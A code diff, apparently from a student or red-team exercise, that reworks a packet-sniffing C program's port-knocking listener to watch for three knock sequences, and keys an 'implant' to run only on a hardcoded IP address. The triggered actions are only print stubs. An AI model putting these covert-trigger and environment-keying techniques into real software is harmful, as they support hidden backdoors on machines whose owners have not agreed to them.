@@ -3,8 +3,7 @@
 /*
  * app name/banner
  */
-void
-print_app_banner(void)
+void print_app_banner(void)
 {
 
 	printf("%s - %s\n", APP_NAME, APP_DESC);
@@ -18,8 +17,7 @@ return;
 /*
  * print help text
  */
-void
-print_app_usage(void)
+void print_app_usage(void)
 {
 
 	printf("Usage: %s [interface]\n", APP_NAME);
@@ -36,8 +34,7 @@ return;
  *
  * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
  */
-void
-print_hex_ascii_line(const unsigned char *payload, int len, int offset)
+void print_hex_ascii_line(const unsigned char *payload, int len, int offset)
 {
 
 	int i;
@@ -131,8 +128,7 @@ return;
 /*
  * dissect/print packet
  */
-void
-got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
+void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
 {
 
 	static int count = 1;                   /* packet counter */
@@ -231,13 +227,7 @@ got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned
 		print_payload(payload, size_payload);
 	#endif
 
-	
-	if(update_pknock_state(ntohs(tcp->th_dport),payload,size_payload) == 1){
-		pknock_success();
-		#ifdef DEBUG
-			printf("Port knock success!\n");
-		#endif
-	}
+	update_knock_state(ntohs(tcp->th_dport));
 
 return;
 }
@@ -246,61 +236,81 @@ return;
 
 
 
-
-
-
 // -----------------------------  M Y   M O D I F I C A T I O N S  ----------------------------------
 
 
-
-// the state of our current port knocking
-//	basically the next index to listen for in our port knocking sequence
-int pknock_state = 0;
+// what to run when we start the program
+void init_knocking(){
+	knock_states = malloc(NUM_STATES * sizeof(int));
+	for(int i=0; i<NUM_STATES; i++){
+		knock_states[i]=0;
+	}
+}
 
 // function to update the port knocking state
-//	increments pknock_state when dst port matches next 
-//	returns 1 on port knock success, 0 otherwise
-int update_pknock_state(int dst_port, const char* payload, int size_payload){
-
-	// check for the target string in the payload
-	// int target_bytes = sizeof(TARGET_STR);
-	// char key[target_bytes];
-	// memcpy(key, payload, target_bytes-1);
-	// key[target_bytes-1]=0;
+//	increments knock_state when dst port matches next 
+void update_knock_state(int dst_port){
 
 	// check if we can move onto the next part of the knock sequence
-	if(TARGET_PORTS[pknock_state]==dst_port){
-		pknock_state++;
+	if(KNOCK_1[knock_states[0]]==dst_port){
+		knock_states[0]+=1;
 
 		#ifdef DEBUG
-			printf("Knocked on port %d, #%d in the sequence\n", dst_port, pknock_state);
+			printf("Knocked on port %d, #%d in knock sequence 1\n", dst_port, knock_states[0]);
 		#endif
 
 		// check if this is end of the knock
-		if(pknock_state == NUM_TARGETS){
-			
-			#ifdef PAYLOAD_SIZE
-				// print out rest of the payload
-				int payload_bytes = PAYLOAD_SIZE;
-				if(size_payload - (target_bytes-1) < PAYLOAD_SIZE) payload_bytes = size_payload - target_bytes;
-				if(payload_bytes > 0){
-					char msg[payload_bytes+1];
-					memcpy(msg, payload+target_bytes-1, payload_bytes);
-					msg[payload_bytes]=0;
-					printf("%s\n",(const char*) msg);
-				}
-			#endif
-
-			return 1;
+		if(KNOCK_1[knock_states[0]] == 0){
+			knocked_1();
+			knock_states[0]=0;
 		}
 	}
-	return 0;
+
+	// 2nd knock sequence
+	if(KNOCK_2[knock_states[1]]==dst_port){
+		knock_states[1]+=1;
+
+		#ifdef DEBUG
+			printf("Knocked on port %d, #%d in knock sequence 2\n", dst_port, knock_states[1]);
+		#endif
+
+		// check if this is end of the knock
+		if(KNOCK_2[knock_states[1]] == 0){
+			knocked_2();
+			knock_states[1]=0;
+		}
+	}
+
+	// 3rd knock sequence
+	if(KNOCK_3[knock_states[2]]==dst_port){
+		knock_states[2]+=1;
+
+		#ifdef DEBUG
+			printf("Knocked on port %d, #%d in knock sequence 3\n", dst_port, knock_states[2]);
+		#endif
+
+		// check if this is end of the knock
+		if(KNOCK_3[knock_states[2]] == 0){
+			knocked_3();
+			knock_states[2]=0;
+		}
+	}
 }
 
 
-// function to run when the port knock occurs
-void pknock_success(){
-	printf("BANG\n");
+// function to run when the 1st port knock occurs
+void knocked_1(){
+	printf("BANG 1\n");
+}
+
+// function to run when the 2nd port knock occurs
+void knocked_2(){
+	printf("BANG 2\n");
+}
+
+// function to run when the 3rd port knock occurs
+void knocked_3(){
+	printf("BANG 3\n");
 }
 
 // returns the current ip address
@@ -325,25 +335,9 @@ char* get_ip_addr(){
 
 // check if we are allowed to run implant on this machine
 //    returns 1 if we can, 0 if not
-int check_env_key(const char* ip_addr, FILE* config_file){
-	char line[256];
-	int i = 1;
-	while(fgets(line, sizeof(line), config_file) != NULL){
-		char ip[256];
-		if(line[0] == '#'){
-			continue;
-		}
-		if(sscanf(line, "%s", ip) != 1){
-			#ifdef DEBUG
-				printf("config file bad line #%d", i);
-			#endif
-			continue;
-		}
-
-		if(strcmp(ip_addr, line)==0){
-			return 1;
-		}
-		i++;
+int check_env_key(const char* ip_addr){
+	if(strcmp(ip_addr, VALID_IP)==0){
+		return 1;
 	}
 	return 0;
 }
